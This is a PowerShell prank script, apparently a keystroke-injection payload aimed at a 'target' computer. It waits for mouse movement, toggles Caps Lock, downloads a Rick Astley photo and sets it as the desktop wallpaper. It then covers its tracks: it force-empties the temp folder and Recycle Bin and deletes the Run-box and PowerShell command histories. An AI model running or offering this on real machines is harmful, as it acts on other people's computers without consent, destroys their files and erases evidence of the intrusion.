function Target-Comes {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}")
            Start-Sleep -Seconds $pauseTime
        }
    }
}

#############################################################################################################################################

Function Set-Volume 
{
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(0,100)]
        [Int]
        $volume
    )

    # Calculate number of key presses. 
    $keyPresses = [Math]::Ceiling( $volume / 2 )
    
    # Create the Windows Shell object. 
    $obj = New-Object -ComObject WScript.Shell
    
    # Set volume to zero. 
    1..50 | ForEach-Object {  $obj.SendKeys( [char] 174 )  }
    
    # Set volume to specified level. 
    for( $i = 0; $i -lt $keyPresses; $i++ )
    {
        $obj.SendKeys( [char] 175 )
    }
}

#############################################################################################################################################

# Set wallpaper to Rick Astley image
function Set-Wallpaper {
    $url = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/07/Rick_Astley_%28Glastonbury_Festival_2019%29.jpg/440px-Rick_Astley_%28Glastonbury_Festival_2019%29.jpg"
    $destination = "$env:TEMP\rick_astley.jpg"
    Invoke-WebRequest $url -OutFile $destination
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value $destination
    rundll32.exe user32.dll, UpdatePerUserSystemParameters
}

# Triggered when the target comes
Target-Comes

# Set wallpaper to Rick Astley image
Set-Wallpaper

# Turn off capslock if it is left on
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true) {
    $key = New-Object -ComObject WScript.Shell
    $key.SendKeys('{CapsLock}')
}

# Empty temp folder
Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete PowerShell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
